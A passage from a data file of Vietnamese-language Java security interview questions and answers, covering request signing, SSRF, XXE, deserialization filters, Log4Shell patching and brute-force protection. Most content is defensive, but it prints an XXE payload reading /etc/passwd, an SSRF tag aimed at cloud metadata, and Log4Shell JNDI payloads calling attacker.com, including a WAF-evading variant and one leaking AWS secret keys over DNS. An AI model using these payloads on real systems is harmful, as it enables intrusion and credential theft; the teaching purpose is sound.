> Senior tip: **Ngân hàng thường yêu cầu digital signature** cho giao dịch chuyển tiền, mở tài khoản — non-repudiation thường là yêu cầu pháp lý/hợp đồng với đối tác. Internal service dùng HMAC cho performance. Luôn canonicalize payload (sorted keys, no whitespace) trước khi sign. Key rotation: HMAC secret rotate 90 ngày, signing cert rotate 1-2 năm. Log tất cả verify failed (potential attack).`,
  follow: [
    'HMAC vs Digital Signature: khi nào dùng cái nào cho open banking API?',
    'Canonicalization payload JSON như thế nào để deterministic (key order, whitespace)?',
    'Làm sao handle clock skew giữa client/server khi verify timestamp?'
  ],
  tags: ['HMAC', 'Digital Signature', 'Non-repudiation', 'Replay Attack', 'Timestamp', 'Nonce', 'RSA-PSS', 'ECDSA']
},
{
  id: 'security-012',
  topic: 'security',
  level: 'senior',
  q: 'SSRF, XXE và insecure deserialization trong Java: cấu hình parser XML an toàn, chặn gọi URL nội bộ. Các vector tấn công thực tế?',
  a: `**Tóm tắt:** **SSRF** (Server-Side Request Forgery): attacker khiến server gọi URL nội bộ (metadata cloud, localhost, private IP). **XXE** (XML External Entity): parser XML resolve external entity → đọc file, SSRF, DoS. **Insecure Deserialization**: Java deserialize untrusted data → gadget chain → RCE. Phòng thủ: whitelist outbound, disable external entity, disable deserialization hoặc dùng ObjectInputFilter.

### SSRF (Server-Side Request Forgery)
- Vector: API fetch URL từ user input (webhook, avatar URL, document import, PDF generator).
- Target: {{http://169.254.169.254}} (AWS metadata), {{http://localhost:8080}}, {{http://127.0.0.1}}, private IP ranges, internal services.
- Impact: credential theft (IAM role), internal service enumeration, RCE via internal admin panel.

~~~java
// ❌ NGUY HIỂM
public String fetchUrl(String url) {
    return new RestTemplate().getForObject(url, String.class);
}

// ✅ AN TOÀN HƠN — allowlist host + chặn IP nội bộ cho MỌI địa chỉ DNS trả về
private static final Set<String> ALLOWED_HOSTS = Set.of("partner.example.com");

public String fetchUrlSafe(String url) throws IOException {
    URI uri = URI.create(url);
    if (!"https".equals(uri.getScheme())) throw new SecurityException("Chỉ cho phép HTTPS");
    if (!ALLOWED_HOSTS.contains(uri.getHost())) throw new SecurityException("Host không nằm trong allowlist");
    for (InetAddress a : InetAddress.getAllByName(uri.getHost())) {
        if (a.isLoopbackAddress() || a.isSiteLocalAddress() || a.isLinkLocalAddress() // 169.254.x = metadata
                || a.isAnyLocalAddress() || a.isMulticastAddress()) {
            throw new SecurityException("IP nội bộ bị chặn: " + a);
        }
        // isSiteLocalAddress() không bao IPv6 ULA fc00::/7, 100.64/10… — cần tự kiểm thêm
    }
    // Client phải: TẮT follow redirect, đặt timeout, giới hạn size response,
    // và kết nối tới đúng IP vừa kiểm (chống DNS rebinding)
    return restClient.get().uri(uri).retrieve().body(String.class);
}
~~~
Trên AWS, bật **IMDSv2** (bắt buộc token PUT, hop limit 1) để SSRF kiểu GET đơn giản không lấy được credential từ metadata.

### XXE (XML External Entity) — Parser XML
- Payload: {{<!ENTITY xxe SYSTEM "file:///etc/passwd">}} → đọc file local.
- Parameter entity + FTP/HTTP → SSRF.
- Billion laughs (entity expansion) → DoS.

~~~java
// ❌ NGUY HIỂM — cấu hình mặc định của JDK vẫn xử lý DTD và external entity
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
Document doc = dbf.newDocumentBuilder().parse(input);

// ✅ AN TOÀN — cấm DOCTYPE (chặn cả XXE lẫn billion laughs)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// Nếu bắt buộc cho phép DOCTYPE thì ít nhất tắt các feature sau:
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
Document doc = dbf.newDocumentBuilder().parse(input);
~~~
Các parser khác cũng phải cấu hình riêng: {{SAXParserFactory}}, {{XMLInputFactory}} (StAX: {{SUPPORT_DTD=false}}), {{TransformerFactory}}/{{SchemaFactory}} ({{XMLConstants.ACCESS_EXTERNAL_DTD}} = chuỗi rỗng), Jackson XML.

### Insecure Deserialization — Java Gadget Chain
- {{ObjectInputStream.readObject()}} trên data không tin cậy → RCE (CommonsCollections, Spring, ROME gadgets).
- Deserialize xảy ra **trước** validation business logic.
- Vector: RMI, JMS, HTTP (session, viewstate), file upload, cache (Redis/Java serialization).

~~~java
// ✅ AN TOÀN — ObjectInputFilter (JEP 290, Java 9+)
// Allowlist + giới hạn tài nguyên, class ngoài danh sách bị từ chối (!*)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "maxdepth=10;maxrefs=10000;maxbytes=1048576;com.myapp.dto.*;java.lang.*;java.util.*;!*");
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filter);
// Hoặc system-wide: -Djdk.serialFilter=... (cùng cú pháp)

// Jackson: KHÔNG bật default typing / @JsonTypeInfo(use = CLASS) cho dữ liệu
// không tin cậy — đó chính là cửa cho gadget chain. Nếu bắt buộc polymorphic:
PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
    .allowIfSubType("com.myapp.dto.") // allowlist package
    .build();
mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);
~~~

### Pitfall thực tế
- **PDF generator** (wkhtmltopdf, headless Chrome) render HTML từ user → SSRF qua {{<img src="http://169.254.169.254">}}.
- **SAML/XML** parsing không disable external entity → XXE.
- **Java serialization** trong Redis session / RMI → deserialization RCE.
- **Log4Shell** (CVE-2021-44228) — bản chất là **JNDI injection**: lookup trong log message khiến app kết nối LDAP/RMI của attacker, nhận về class/object độc → RCE.

> Senior tip: **Mặc định deny all outbound** — chỉ whitelist domain/IP partner. Dùng egress proxy (Envoy, Squid) enforce policy. XML parser: set feature {{disallow-doctype-decl=true}} ngay khi init. Deserialization: {{ObjectInputFilter}} (JEP 290; Java 17 có thêm filter factory theo context — JEP 415), tốt nhất là không deserialize Java native từ nguồn không tin cậy. Log4Shell: upgrade Log4j 2.17.1+ (Java 8) — từ 2.16.0 JNDI bị tắt mặc định và message lookup bị gỡ; {{log4j2.formatMsgNoLookups=true}} chỉ là biện pháp tạm và **không đủ** (bị bypass, CVE-2021-45046).`,
  follow: [
    'SSRF bypass qua DNS rebinding / TOCTOU — cách phòng thủ?',
    'XXE qua parameter entity (blind XXE) exploit thế nào?',
    'Java {{ObjectInputFilter}} pattern matching syntax như thế nào? Whitelist vs blacklist?'
  ],
  tags: ['SSRF', 'XXE', 'Insecure Deserialization', 'ObjectInputFilter', 'XML Parser', 'Gadget Chain', 'Log4Shell']
},
{
  id: 'security-013',
  topic: 'security',
  level: 'lead',
  q: 'Lỗ hổng thư viện (Log4Shell CVE-2021-44228): SCA, SBOM, quy trình vá khẩn trong ngân hàng. Phân tích root cause và lessons learned?',
  a: `**Tóm tắt:** **Log4Shell** (CVE-2021-44228, CVSS 10.0) — JNDI lookup trong Log4j 2.x khi log message chứa payload JNDI → RCE. Root cause: **message lookup substitution** feature cho phép JNDI lookup không bị restrict. Lessons: SCA (Software Composition Analysis) bắt buộc trong CI/CD, SBOM (Software Bill of Materials) để biết dependency tree, quy trình vá khẩn 24-72h cho critical CVE, defense-in-depth (WAF, egress firewall, runtime protection).

### Root Cause Analysis
- Log4j 2.0-beta9 đến 2.14.1: {{MessagePatternConverter}} xử lý
~~~text
\${prefix:name}
~~~
→ {{StrSubstitutor}} resolve.
- {{jndi:}} prefix trigger {{JndiLookup}} → {{JndiManager.lookup()}} → connect đến LDAP/RMI server attacker → server trả về Reference trỏ tới class remote (JDK cũ cho tải class từ codebase URL) hoặc serialized object khai thác gadget có sẵn trong classpath → RCE.
- Kể cả khi không RCE được, lookup như {{env:}} lồng trong {{jndi:ldap}} / DNS vẫn làm **rò rỉ secret** (biến môi trường) ra ngoài.
- Bất kỳ data nào attacker kiểm soát mà được log (header, parameter, body, username) đều trigger — kể cả log kiểu parameterized.

### Payload JNDI mẫu
~~~text
\${jndi:ldap://attacker.com:1389/Exploit}
\${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://attacker.com/x}   # obfuscated, né WAF
\${jndi:ldap://\${env:AWS_SECRET_ACCESS_KEY}.attacker.com/a}                     # rò rỉ secret qua DNS
# Trigger: log.info("User-Agent: " + userAgent);
# Kể cả log.info("User-Agent: {}", userAgent) cũng dính (2.0-beta9 → 2.14.1)
~~~

### SCA (Software Composition Analysis) — Phát hiện sớm
- **Tools**: OWASP Dependency-Check, Snyk, Sonatype OSS Index, GitHub Dependabot, Trivy, Grype.
- **CI/CD Integration**: fail build nếu critical/high CVE trong dependency (block merge).
- **Transitive dependency**: SCA quét toàn bộ dependency tree, không chỉ direct.
- **Policy**: critical CVE → block deploy, 24h remediation; high → 72h.

### SBOM (Software Bill of Materials) — Biết mình có gì
- Format: **SPDX** (Software Package Data Exchange), **CycloneDX** (OWASP).
- Chứa: component name, version, supplier, hash, license, CVE mapping.
- Generate tại build time: {{mvn cyclonedx:makeAggregateBom}}, {{syft dir:. -o cyclonedx-json}}.
- Sử dụng: quick impact assessment khi CVE mới xuất hiện (grep SBOM cho {{log4j-core}}).

### Quy trình vá khẩn trong ngân hàng (Critical CVE)
| Giai đoạn | Thời gian | Hành động |
|---|---|---|
| **Detect** | T+0 | SCA alert / CVE publish / Threat intel feed |
| **Triage** | T+1h | Security team confirm affected, assess exploitability |
| **Contain** | T+2h | WAF rule chặn chuỗi lookup chứa {{jndi:}}, egress firewall block outbound LDAP/RMI; nếu chưa upgrade kịp: xoá class {{JndiLookup}} khỏi jar {{log4j-core}} (biện pháp tạm được Apache khuyến nghị) |
| **Patch** | T+24h | Upgrade log4j-core 2.17.1+ (Java 8; 2.12.4 cho Java 7, 2.3.2 cho Java 6), rebuild, test, deploy canary |
| **Verify** | T+48h | Scan lại, penetration test, confirm fix |
| **Report** | T+72h | Báo cáo CISO/Regulator, update SBOM, lessons learned |

### Defense-in-depth (không chỉ patch)
- **WAF**: rule chặn chuỗi lookup chứa {{jndi:}} và dạng lookup lồng nhau trong header/body — chỉ là lớp tạm, payload obfuscate có thể vượt qua.
- **Egress firewall**: block outbound LDAP (389), RMI (1099), DNS to unknown.
- **Runtime protection**: Java agent (Contrast, Datadog) detect JNDI lookup.
- **Logging hygiene**: không log raw user input, sanitize trước khi log.

> Senior tip: **Log4Shell là wake-up call cho supply chain security**. Nên đặt thành chuẩn nội bộ: SBOM cho mọi release, SCA gate trong CI/CD, SLA vá critical CVE (ví dụ 24–72h), WAF managed rule tự cập nhật. Không chỉ Log4j — tương tự Spring4Shell (CVE-2022-22965), Jackson gadget. Bài học lớn nhất: **biết ngay mình đang chạy version nào ở đâu** (SBOM + inventory) và có pipeline đủ nhanh để rebuild/redeploy toàn bộ service trong vài giờ.`,
  follow: [
    'Log4j 2.15.0 fix ban đầu bị bypass như thế nào (CVE-2021-45046)?',
    'SBOM CycloneDX vs SPDX — chọn cái nào cho compliance ngân hàng VN?',
    'Làm sao detect Log4Shell exploit attempt trong production log real-time?'
  ],
  tags: ['Log4Shell', 'CVE-2021-44228', 'SCA', 'SBOM', 'Supply Chain Security', 'Vulnerability Management', 'JNDI']
},
{
  id: 'security-014',
  topic: 'security',
  level: 'senior',
  q: 'Chống brute force đăng nhập: rate limit theo user/IP, khóa tạm, CAPTCHA, phát hiện credential stuffing. Cách implement production-ready?',
  a: `**Tóm tắt:** **Layered defense**: rate limit per IP + per user (sliding window), account lockout tăng dần (exponential backoff), CAPTCHA sau N lần fail, device fingerprint + behavioral analysis cho credential stuffing. Spring Boot: {{Bucket4j}} / {{Resilience4j}} rate limiter, Redis lưu counter, {{PwnedPasswords}} check password bị leak.

### Rate Limiting Strategy
| Layer | Scope | Algorithm | Config ví dụ |
|---|---|---|---|
| **Network/WAF** | IP | Token bucket | 100 req/min/IP, burst 20 |
| **Application** | IP + User | Sliding window log | 5 req/15min/IP, 10 req/15min/user |
| **Login endpoint** | User | Fixed window + exponential backoff | 5 fail → lock 15m, 10 fail → lock 1h, 20 fail → lock 24h |

### Account Lockout — Exponential Backoff
- Fail 1-4: không lock, chỉ rate limit.
- Fail 5: lock 15 phút.
- Fail 10: lock 1 giờ.
- Fail 20: lock 24 giờ, yêu cầu MFA reset qua email/SMS.
- Unlock: tự động sau timeout, hoặc admin unlock, hoặc user self-service qua link email.

~~~java
// Redis-based rate limiter + lockout
@Service
@RequiredArgsConstructor
public class LoginProtectionService {
    private final RedisTemplate<String, String> redis;
    private static final int MAX_ATTEMPTS = 5;
    private static final int WINDOW_MINUTES = 15;

    public void recordFailedAttempt(String username, String ip) {
        // Đếm theo USER (không gộp với IP — botnet đổi IP liên tục) và đếm riêng theo IP
        String key = "login:fail:user:" + username;
        Long count = redis.opsForValue().increment(key);
        if (count == 1) redis.expire(key, Duration.ofMinutes(WINDOW_MINUTES)); // nên gộp atomic bằng Lua
        Long ipCount = redis.opsForValue().increment("login:fail:ip:" + ip); // dùng cho rate limit/CAPTCHA theo IP

        if (count >= MAX_ATTEMPTS) {
            lockAccount(username, calculateLockDuration(count));
        }
    }

    private void lockAccount(String username, Duration duration) {
        String lockKey = "login:lock:" + username;
        redis.opsForValue().set(lockKey, "LOCKED", duration);
        // Audit log
        auditLog.warn("Account locked: user={}, duration={}", username, duration);
    }

    public boolean isLocked(String username) {
        return Boolean.TRUE.equals(redis.hasKey("login:lock:" + username));
    }
}
~~~

### CAPTCHA — Human Verification
- Trigger: sau 3-5 lần fail, hoặc score risk cao (new device, new geo, VPN/Tor).
- Provider: **hCaptcha** (privacy-friendly), **reCAPTCHA v3** (invisible, score-based), **Turnstile** (Cloudflare).
- Accessibility: cung cấp audio challenge, fallback cho screen reader.

### Credential Stuffing Detection
- **Dữ liệu**: danh sách credential bị leak (Have I Been Pwned, internal breach DB).
- **Kiểm tra**: registration/password change → check PwnedPasswords API (k-anonymity model, chỉ gửi 5 char đầu SHA-1).
- **Behavioral**: device fingerprint (canvas, font, timezone), IP reputation (AbuseIPDB), impossible travel (login từ 2 quốc gia trong 1h), user agent anomaly.
- **Response**: force MFA, step-up authentication, notify user, temporary lock.

~~~java
// PwnedPasswords check (k-anonymity)
public boolean isPwned(String password) {
    String sha1 = sha1(password).toUpperCase();
    String prefix = sha1.substring(0, 5);
    String suffix = sha1.substring(5);
    String response = webClient.get().uri("https://api.pwnedpasswords.com/range/" + prefix)
        .retrieve().bodyToMono(String.class).block();
    return Arrays.stream(response.split("\\r?\\n"))
        .anyMatch(line -> line.startsWith(suffix));
}
~~~

### Monitoring & Alerting
- Metrics: {{login.failure.rate}}, {{login.lockout.count}}, {{captcha.challenge.rate}}, {{credential.stuffing.detected}}.
- Alert: spike failure rate > 5x baseline, lockout > 100 accounts/15m, new geo login for admin.
- Dashboard: real-time login heatmap (geo, device, outcome).

> Senior tip: **Không chỉ rate limit IP** — attacker dùng botnet (nghìn IP). Rate limit per **user** là quan trọng hơn. Lockout phải có **exponential backoff** để không DoS legitimate user. Luôn check **PwnedPasswords** khi đăng ký/đổi pass (NIST SP 800-63B khuyến nghị đối chiếu danh sách mật khẩu đã lộ). Để ngưỡng CAPTCHA/lockout trong config động (feature flag, config server) để chỉnh nhanh khi đang bị tấn công, không cần deploy. Trả cùng một thông báo lỗi cho "sai user" và "sai mật khẩu" để chống dò username. Với ngân hàng: bắt buộc MFA cho mọi login, device registration (trusted device bypass CAPTCHA).`,
  follow: [
    'Rate limit sliding window vs fixed window vs token bucket — khác nhau như thế nào cho login?',
    'Credential stuffing vs password spraying — khác nhau ở đâu, detect như thế nào?',
    'Làm sao balance UX (ít friction) vs security (chống brute force) cho user hợp pháp?'
  ],
  tags: ['Brute Force', 'Rate Limiting', 'Account Lockout', 'CAPTCHA', 'Credential Stuffing', 'PwnedPasswords', 'Redis', 'MFA']
},
);